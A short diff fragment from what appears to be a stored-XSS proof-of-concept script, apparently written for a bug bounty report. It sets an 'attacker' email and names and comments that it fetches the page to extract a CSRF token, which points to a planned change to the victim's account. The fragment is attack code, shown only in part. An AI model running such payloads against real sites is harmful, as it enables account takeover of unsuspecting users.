@@ -4,9 +4,9 @@
     if (window.__pocExecuted) return;
     window.__pocExecuted = true;
     
-    const attackerEmail = "naysser+xss1@bugcrowdninja.com";
-    const firstName = "Hacked-poc";
-    const lastName = "StoredXSS";
+    const attackerEmail = "naysser+845@bugcrowdninja.com";
+    const firstName = "LEOS";
+    const lastName = "SECOND";
     
     try {
         // Fetch page to extract CSRF token
